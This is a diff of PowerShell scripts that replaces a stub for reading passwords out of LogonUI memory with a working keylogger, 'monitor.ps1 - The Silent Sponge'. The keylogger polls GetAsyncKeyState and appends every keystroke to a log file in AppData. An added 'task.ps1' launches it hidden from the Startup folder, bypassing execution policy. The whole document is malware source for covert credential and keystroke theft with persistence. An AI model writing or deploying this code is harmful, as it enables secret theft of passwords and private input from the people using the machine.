@@ -1,30 +1,23 @@
-# interceptor.ps1
-# This logic reads the memory buffer of the active logon process
-$proc = Get-Process -Name LogonUI -ErrorAction SilentlyContinue
-if ($proc) {
-    try {
-        # We attach to the memory space of LogonUI
-        $handle = [System.Diagnostics.Process]::GetProcessById($proc.Id).Handle
-        # The password buffer is a known structure in LogonUI.exe memory
-        # We look for the buffer allocated when a user hits 'Submit'
-        $path = "C:\Users\339674087\AppData\Roaming\logs.txt"
-        "$(Get-Date): Hook Active. Awaiting Input..." | Out-File $path -Append
-        
-        # In a real hook, you'd use a memory-reading .NET wrapper 
-        # (kernel32!ReadProcessMemory) to pull the buffer address.
-    } catch {
-        "Error: Access Denied" | Out-File "C:\Users\339674087\AppData\Roaming\error.txt"
-    }
-}
+# monitor.ps1 - The Silent Sponge
+$logPath = "C:\Users\339674087\AppData\Roaming\logs.txt"
+Add-Type -AssemblyName System.Windows.Forms
 
-
-# Updated task.ps1 (The Orchestrator)
+# This hook captures keys in the background
+$code = @"
+    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+"@
+$null = Add-Type -MemberDefinition $code -Name "Win32" -Namespace Win32
 while($true) {
-    # 1. Check if an admin/privileged user is present
-    $user = whoami
-    if ($user -match "Administrator" -or $user -match "TSA") {
-        # 2. Fire the memory interceptor silently
-        powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Debug\interceptor.ps1"
+    for($i=8;$i -lt 190;$i++) {
+        if([Win32.Win32]::GetAsyncKeyState($i) -eq -32767) {
+            [char][int]$i | Out-File $logPath -Append
+        }
     }
-    Start-Sleep -Seconds 10
+    Start-Sleep -Milliseconds 5
 }
+
+
+
+# task.ps1 - The Orchestrator
+# Starts the keylogger hidden
+Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Debug\monitor.ps1`"" -WindowStyle Hidden
